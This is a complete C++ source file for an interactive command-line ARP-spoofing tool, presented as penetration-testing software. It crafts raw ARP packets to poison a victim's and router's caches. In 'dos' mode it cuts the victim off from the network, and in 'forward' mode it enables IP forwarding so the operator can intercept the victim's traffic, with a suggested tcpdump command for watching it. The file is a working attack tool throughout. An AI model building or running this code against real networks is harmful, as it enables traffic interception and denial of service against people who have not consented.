#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iomanip>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>           
#include <linux/if_ether.h> 
#include <linux/if_packet.h>  
#include <sys/ioctl.h>
#include <net/ethernet.h> 
#include <iostream>
#include <time.h>
#include <unistd.h>
#include <fstream>
#include <signal.h>
#include <iomanip>

#pragma pack(push, 1)
struct arp_req {
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint16_t eth_type;

    uint16_t eth_prot;
    uint16_t send_prot;
    uint8_t hwlen;
    uint8_t send_len;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];

    uint8_t padding[18];
};
#pragma pack(pop)

std::string victim_ip{};
std::string router_ip{};
uint8_t victim_inet_ip[4];
uint8_t router_inet_ip[4];
uint8_t victim_mac[6];
uint8_t router_mac[6];
std::string attacker_ip;
uint8_t attacker_inet_ip[4];
uint8_t attacker_mac[6];
uint32_t interface_index;
std::string interface;

sockaddr_ll bsa{};
sockaddr_ll ssa{};

uint8_t is_dos{};
std::string mode{};

void loop_sigint_callback(int);

void hello_banner() {
    std::cout << "\n\n";
    std::cout << "================================================================\n";
    std::cout << "‖    ______  __   __    _____     ______     _____    ______   ‖\n";
    std::cout << "‖   / ____/ |  | |  |  /  _  \\   /  _   \\   /  _  \\  / ____/   ‖\n";
    std::cout << "‖  / /____  |  |_|  | |  |_|  | |  |_|  |  |  |_| | / /____    ‖\n";
    std::cout << "‖  \\____  \\ |   _   | |   _   | |   _   /  |   ___/ \\____  \\   ‖\n";
    std::cout << "‖   ____/ / |  | |  | |  | |  | |  | \\  \\  |  |      ____/ /   ‖\n";
    std::cout << "‖  /_____/  |__| |__| |__| |__| |__|  \\__\\ |__|     /_____/    ‖\n‖                                                              ‖\n";
    std::cout << "================================================================\n";
    std::cout << "\n\tARP-spoofer by s4yHi\n\tPenetration testing software\n\tBe careful\n\n[i] Type -h to get a help\n\n"; 
}

int set_if(const std::string& interface) {
    interface_index = if_nametoindex(interface.c_str());

    if (!interface_index) {
        return -1;
    }

    ::interface = interface;
    return 0;
}

int set_mode(const std::string& mode) {
    if (mode == "dos") {
        ::mode = mode;
        is_dos = 1;
        return 0;
    }

    else if (mode == "forward") {
        ::mode = mode;
        is_dos = 2;
        return 0;
    }

    return -1;
}

int set_ip(const uint8_t index, const std::string& ip) {
    switch (index) {
        case 0: {
            if (inet_pton(AF_INET, ip.c_str(), victim_inet_ip) != 1) return -1;
            break;
        }

        case 1: {
            if (inet_pton(AF_INET, ip.c_str(), router_inet_ip) != 1) return -2;
            break;
        }

        case 2: {
            if (inet_pton(AF_INET, ip.c_str(), attacker_inet_ip) != 1) return -3;
            break;
        }

        default: return -4;
    }

    return 0;
}

int arp_request(const uint8_t* target_ip) {
    signal(SIGINT, loop_sigint_callback);

    int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) return -1;

    uint8_t dst_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t src_mac[6] = {0, 0, 0, 0, 0, 0};

    ifreq ifr;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_ifrn.ifrn_name, interface.c_str(), IF_NAMESIZE -1);
    ifr.ifr_ifrn.ifrn_name[IF_NAMESIZE - 1] = '\0';

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return -2;
    }

    memcpy(attacker_mac, ifr.ifr_ifru.ifru_hwaddr.sa_data, 6);

    memset(&bsa, 0, sizeof(bsa));
    memset(&ssa, 0, sizeof(ssa));

    bsa.sll_family = AF_PACKET;
    bsa.sll_ifindex = interface_index;
    bsa.sll_protocol = htons(ETH_P_ARP);
    bsa.sll_halen = 6;
    memcpy(bsa.sll_addr, attacker_mac, 6);

    if (bind(sock, (sockaddr*)&bsa, sizeof(bsa)) < 0) {
        close(sock);
        return -3;
    }

    arp_req pack;

    memcpy(pack.dest_mac, dst_mac, 6);
    memcpy(pack.src_mac, attacker_mac, 6);
    pack.eth_type = htons(ETH_P_ARP);

    pack.eth_prot = htons(1);
    pack.send_prot = htons(ETH_P_IP);
    pack.send_len = 4;
    pack.hwlen = 6;
    pack.opcode = htons(1);
    memcpy(pack.sender_mac, attacker_mac, 6);
    memcpy(pack.sender_ip, attacker_inet_ip, 4);
    memcpy(pack.target_mac, src_mac, 6);
    memcpy(pack.target_ip, target_ip, 4);

    memset(pack.padding, 0, 18);

    ssa.sll_family = AF_PACKET;
    ssa.sll_halen = 6;
    ssa.sll_pkttype = PACKET_BROADCAST;
    ssa.sll_ifindex = interface_index;
    ssa.sll_protocol = htons(ETH_P_ARP);
    memcpy(ssa.sll_addr, dst_mac, 6);

    if (sendto(sock, &pack, sizeof(pack), 0, (sockaddr*)&ssa, sizeof(ssa)) < 0) {
        close(sock);
        return -4;
    }

    close(sock);
    return 0;
}

int arp_receive(const uint8_t* target_ip, uint8_t* target_mac) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) return -1;

    arp_req rec_pack;
    uint8_t attemps{5};

    while (attemps) {
        if (recvfrom(sock, &rec_pack, sizeof(rec_pack), 0, NULL, NULL) <= 0) {
            return -2;
            close(sock);
        }

        if (rec_pack.opcode == htons(2) && !memcmp(target_ip, rec_pack.sender_ip, 4)) {
            memcpy(target_mac, rec_pack.sender_mac, 6);
            close(sock);
            return 0;
        }

        --attemps;
    }

    return 1;
}

int ip_forwarding(const bool& is_forward) {
    std::ofstream file("/proc/sys/net/ipv4/ip_forward");

    if (file.is_open()) {
        file << (is_forward ? "1" : "0");
        file.close();

        return 0;
    }

    return -1;
}

int arp_spoofing(const uint8_t* host_ip, const uint8_t* host_mac, const uint8_t* victim_ip, const uint8_t* victim_mac) {
    int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    if (sock < 0) {
        return -1;
    }

    memset(&bsa, 0, sizeof(bsa));
    memset(&ssa, 0, sizeof(ssa));

    bsa.sll_halen = 6;
    bsa.sll_protocol = htons(ETH_P_ARP);
    bsa.sll_family = AF_PACKET;
    bsa.sll_ifindex = interface_index;
    memcpy(bsa.sll_addr, host_mac, 6);

    if (bind(sock, (sockaddr*)&bsa, sizeof(bsa)) < 0) {
        close(sock);
        return -2;
    }

    ssa.sll_halen = 6;
    ssa.sll_family = AF_PACKET;
    ssa.sll_ifindex = interface_index;
    ssa.sll_protocol = htons(ETH_P_ARP);
    memcpy(ssa.sll_addr, victim_mac, 6);

    arp_req pack;

    memcpy(pack.dest_mac, victim_mac, 6);
    memcpy(pack.src_mac, host_mac, 6);
    pack.eth_type = htons(ETH_P_ARP);

    pack.eth_prot = htons(1);
    pack.send_prot = htons(ETH_P_IP);
    pack.send_len = 4;
    pack.hwlen = 6;
    pack.opcode = htons(2);

    memcpy(pack.sender_mac, host_mac, 6);
    memcpy(pack.sender_ip, host_ip, 4);
    memcpy(pack.target_mac, victim_mac, 6);
    memcpy(pack.target_ip, victim_ip, 4);

    if (sendto(sock, &pack, sizeof(pack), 0, (sockaddr*)&ssa, sizeof(ssa)) < 0) {
        close(sock);
        return -3;
    }

    char a[16];
    char b[16];

    inet_ntop(AF_INET, pack.sender_ip, a, 16);
    inet_ntop(AF_INET, pack.target_ip, b, 16);


    printf("[*] Spoofing pack sent : %s | MAC: %02x:%02x:%02x:%02x:%02x:%02x -> %s | MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   a, pack.sender_mac[0], pack.sender_mac[1], pack.sender_mac[2],
                   pack.sender_mac[3], pack.sender_mac[4], pack.sender_mac[5], b,
                   pack.target_mac[0], pack.target_mac[1], pack.target_mac[2],
                   pack.target_mac[3], pack.target_mac[4], pack.target_mac[5]);

    close(sock);
    return 0;
}

bool is_get_mac_success(const uint8_t* victim_ip, uint8_t* victim_mac, const std::string& output) {
            for (uint8_t i{}; i < 5; ++i) {
                switch (arp_request(victim_ip)) {
                    case -1: {
                        std::cout << "[-] Cannot create raw socket\n";
                        return false;
                    }

                    case -2: {
                        std::cout << "[-] Cannot get attacker's mac\n";
                        return false;
                    }

                    case -3: {
                        std::cout << "[-] Cannot bind socket\n";
                        return false;
                    }

                    case -4: {
                        std::cout << "[-] Cannot send ARP-packet\n";
                        return false;
                    }
                }

                usleep(50000);
            }

            std::cout << "[+] ARP-request sent to " << output << ". Waiting response\n";

            switch (arp_receive(victim_ip, victim_mac)) {
                case 1: {
                    std::cout << "[-] Attemps to receive overed\n"; 
                    return false;
                }

                case -1: {
                    std::cout << "[-] Cannot create raw socket\n"; 
                    return false;
                }

                case -2: {
                    std::cout << "[-] Cannot receive packet\n";
                    return false;
                }
            }

            std::cout << "[+] ARP-response from " << output << " received\n";
            return true;
}

bool is_spoofing_success(const uint8_t* sender_inet_ip, const uint8_t* attacker_mac, const uint8_t* victim_inet_ip, const uint8_t* victim_mac) {
                switch(arp_spoofing(sender_inet_ip, attacker_mac, victim_inet_ip, victim_mac)) {
                case -1: {
                    std::cout << "[-] Cannot create raw socket\n";
                    return false;
                }

                case -2: {
                    std::cout << "[-] Cannot get attacker's mac\n";
                    return false;
                }

                case -3: {
                    std::cout << "[-] Cannot bind socket\n";
                    return false;
                }
            }
            return true;
}

void default_sigint_callback(int) {
    std::cout << "\n[i] Session finished\n\n";
    exit(0);
}

bool loop = true;

void loop_sigint_callback(int) {
    std::cout << "\n[i] Process terminated\n";
    signal(SIGINT, default_sigint_callback);

    if (is_dos == 2) {
        if (ip_forwarding(false) < 0) {
            std::cout << "[-] Cannot disable IP-forwarding\n\n";
        }

        std::cout << "[+] IP-forwarding disable\n\n";
    }

    loop = false;
}

void start_spoofing() {
    if (is_dos == 2) {
        if (ip_forwarding(true) < 0) {
            std::cout << "[-] Cannot enable IP-forwarding\n\n";
            return;
        }

        std::cout << "[+] IP-forwarding enable\n\n";
    } else {
        std::cout << "\n[+] DOS-mode enable\n\n";
    }

    while (loop) {
        for (uint8_t i{}; i < 2; ++i) {
            if (!is_spoofing_success(router_inet_ip, attacker_mac, victim_inet_ip, victim_mac)) return;

            if (is_dos == 2) {
                if (!is_spoofing_success(victim_inet_ip, attacker_mac, router_inet_ip, router_mac)) return;
            }

            std::cout << "\n";

            usleep(50000);
        }

        sleep(1);
    }
}

bool check_fields() {
    uint8_t flag{};

    if (victim_ip.empty()) { std::cout << "[!] Victim's ip must be set\n"; flag++; }
    if (router_ip.empty()) { std::cout << "[!] Router's ip must be set\n"; flag++; }
    if (attacker_ip.empty()) { std::cout << "[!] Yours ip must be set\n"; flag++; }
    if (::interface.empty()) { std::cout << "[!] Interface must be set\n"; flag++; }
    if (!is_dos) { std::cout << "[!] Mode must be set\n"; flag++; }

    return flag ? false : true;
}

void inline print_info(const char* msg, const std::string& obj) {
    std::cout << std::setw(20) << std::left << msg;
    if (obj.empty()) std::cout << std::right << "not set\n";
    else std::cout << obj << '\n';
}

void main_loop() {
    if (getuid()) {
        std::cout << "[!] Process must be start as root\n";
        return;
    }

    while (true) {
        std::string input;

        std::cout << "sh4rps# ";
        std::getline(std::cin, input);

        if (input.empty()) {
            continue;
        }

        if (input == "-h") {
            std::cout << "[i] Manual :\n    Enter \"-vip=111.222.111.222\" to set victim's ipv4 address\n    " <<
                            "Enter \"-rip=111.222.111.222\" to set router's ipv4 address\n    " << 
                            "Enter \"-oip=111.222.111.222\" to set your own ipv4 address\n    " << 
                            "Enter \"-if=interface\" (wlan0 or eth0) to set interface\n    " <<
                            "Enter \"-mode=md\" (dos [denial of service - victim cannot get Internet access] or forward [you'll become router for victim])\n    " <<
                            "Enter \"-i\" to get current victim and router's ipv4 addresses\n    " <<
                            "Enter \"!start\" to begin spoofing\n    Enter \"exit\" or press Control + C to finish session\n";
        }

        else if (input == std::string("-i")) {
            print_info("[i] Victim's ip : ", victim_ip);
            print_info("[i] Router's ip : ", router_ip);
            print_info("[i] Yours ip : ", attacker_ip);
            print_info("[i] Interface : ", interface);
            print_info("[i] Mode : ", mode);
        }

        else if (input.substr(0, 5) == std::string("-vip=")) {
            if (set_ip(0, input.substr(5)) < 0) {
                std::cout << "[-] Cannot set victim's ip\n";
                continue;
            }

            if (input.substr(5) != victim_ip) {
                memset(victim_mac, 0, 6);
            }

            victim_ip = input.substr(5);
        }

        else if (input.substr(0, 5) == std::string("-rip=")) {
            if (set_ip(1, input.substr(5)) < 0) {
                std::cout << "[-] Cannot set router's ip\n";
                continue;
            }

            if (input.substr(5) != router_ip) {
                memset(router_mac, 0, 6);
            }

            router_ip = input.substr(5);
        }

        else if (input.substr(0, 5) == std::string("-oip=")) {
            if (set_ip(2, input.substr(5)) < 0) {
                std::cout << "[-] Cannot set yours ip\n";
                continue;
            }

            if (input.substr(5) != attacker_ip) {
                memset(attacker_mac, 0, 6);
            }

            attacker_ip = input.substr(5);
        }

        else if (input.substr(0, 4) == "-if=") {
            if (set_if(input.substr(4)) < 0) {
                std::cout << "[-] Invalid interface name\n";
            }
        }

        else if (input.substr(0, 6) == "-mode=") {
            if (set_mode(input.substr(6)) < 0) {
                std::cout << "[-] Invalid mode\n";
            }
        }

        else if (input == std::string("!start")) {
            if (!check_fields()) goto cont;
            loop = true;

            std::cout << "[+] Process started\n[i] Try commands to spectate trafic in another terminal like \n    sudo tcpdump -i wlan0 -A -s 0 'tcp port 443 and host <victim_ip>'\n[i] Press Control + C to terminate loop and return to command-line\n\n";

            if (!victim_mac[0]) {
                if (!is_get_mac_success(victim_inet_ip, victim_mac, "victim")) goto cont;
            }
            
            if (!router_mac[0]) {
                if (!is_get_mac_success(router_inet_ip, router_mac, "router")) goto cont;
            }

            start_spoofing();

            cont: continue;
        }

        else if (input == std::string("exit")) {
            std::cout << "[i] Session finished\n\n";
            return;
        }

        else {
            std::cout << "Unexpected token : " << input << '\n';
        }
    }
}

int main() {
    signal(SIGINT, default_sigint_callback);

    hello_banner();
    main_loop();

    return 0;
}
